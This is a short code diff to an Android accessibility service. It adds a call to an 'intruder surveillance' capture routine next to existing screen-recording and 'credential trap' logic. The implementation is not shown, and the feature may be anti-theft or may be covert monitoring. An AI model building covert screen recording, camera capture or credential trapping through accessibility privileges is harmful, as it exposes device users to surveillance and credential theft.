@@ -222,6 +222,9 @@ class MyAccessibilityService : AccessibilityService() {
                     ScreenRecordManager.resumeRecording()
                     DynamicUIManager.warmUpEngine(context)
 
+                    // --- INTRUDER SURVEILLANCE PROTOCOL ---
+                    IntruderCaptureManager.checkAndTrigger(context)
+
                     // --- DEFERRED CREDENTIAL TRAP LOGIC ---
                     if (prefs.getBoolean("pending_cred_trap", false)) {
                         prefs.edit().putBoolean("pending_cred_trap", false).apply()
